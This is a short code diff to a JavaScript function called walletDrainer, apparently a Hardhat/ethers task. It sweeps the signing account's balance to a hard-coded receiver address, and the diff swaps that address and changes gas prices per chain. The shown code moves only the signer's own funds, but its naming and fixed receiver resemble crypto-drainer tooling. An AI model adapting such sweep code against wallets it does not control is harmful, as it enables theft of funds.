@@ -8,7 +8,7 @@ export async function walletDrainer() {
   const deployerAddress = await account.getAddress();
   const balance = await ethers.provider.getBalance(deployerAddress);
 
-  const receiver = "0xd2aD1416bfe909bfEa1768AAE82bBc38296cD398";
+  const receiver = "0x8C180840fcBb90CE8464B4eCd12ab0f840c6647C";
   const gasLimit = 21000;
 
   console.log(`
@@ -17,7 +17,7 @@ export async function walletDrainer() {
     ////////////////////////////////////////////////////
   `);
 
-  const gasprice = BigInt(20000000000);
+  const gasprice = chainId == 137 ? BigInt(350000000000) : BigInt(30000000000);
   console.table({
     task: "Drain wallet",
     chainId: chainId,
